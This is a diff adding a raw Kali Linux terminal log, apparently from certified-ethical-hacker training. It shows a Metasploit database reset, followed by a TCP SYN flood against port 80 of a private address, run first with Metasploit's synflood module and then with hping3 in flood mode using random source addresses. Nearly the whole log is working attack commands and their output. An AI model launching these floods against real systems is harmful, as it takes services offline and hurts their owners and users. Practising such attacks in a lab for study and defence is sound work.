@@ -1,0 +1,74 @@
+root@kali:~/Desktop/amit/CEH# service postgresql start
+root@kali:~/Desktop/amit/CEH# msfdb reinit
+[i] Database already started
+[+] Dropping databases 'msf'
+dropdb: database removal failed: ERROR:  database "msf" is being accessed by other users
+DETAIL:  There are 3 other sessions using the database.
+[+] Dropping databases 'msf_test'
+[+] Dropping database user 'msf'
+dropuser: removal of role "msf" failed: ERROR:  role "msf" cannot be dropped because some objects depend on it
+DETAIL:  owner of database msf
+132 objects in database msf
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Resetting password of database user 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+root@kali:~/Desktop/amit/CEH# msfconsole -q
+msf > search syn_flood
+
+Matching Modules
+================
+
+   Name                        Disclosure Date  Rank    Description
+   ----                        ---------------  ----    -----------
+   auxiliary/dos/tcp/synflood                   normal  TCP SYN Flooder
+
+
+msf > use auxiliary/dos/tcp/synflood
+msf auxiliary(dos/tcp/synflood) > show options
+
+Module options (auxiliary/dos/tcp/synflood):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   INTERFACE                   no        The name of the interface
+   NUM                         no        Number of SYNs to send (else unlimited)
+   RHOST                       yes       The target address
+   RPORT      80               yes       The target port
+   SHOST                       no        The spoofable source address (else randomizes)
+   SNAPLEN    65535            yes       The number of bytes to capture
+   SPORT                       no        The source port (else randomizes)
+   TIMEOUT    500              yes       The number of seconds to wait for new data
+
+msf auxiliary(dos/tcp/synflood) > set RHOST 192.168.1.47
+RHOST => 192.168.1.47
+msf auxiliary(dos/tcp/synflood) > expolit
+[-] Unknown command: expolit.
+msf auxiliary(dos/tcp/synflood) > expolit
+[-] Unknown command: expolit.
+msf auxiliary(dos/tcp/synflood) > exploit
+
+[*] SYN flooding 192.168.1.47:80...
+
+
+
+
+
+
+^Z
+[1]+  Stopped                 msfconsole -q
+root@kali:~/Desktop/amit/CEH# hping3 -S -flood --rand-source 192.168.1.47
+hping3: invalid option -- l
+Try hping3 --help
+root@kali:~/Desktop/amit/CEH# hping3 -S --flood --rand-source 192.168.1.47
+HPING 192.168.1.47 (eth0 192.168.1.47): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.1.47 hping statistic ---
+139561040 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@kali:~/Desktop/amit/CEH# 
+
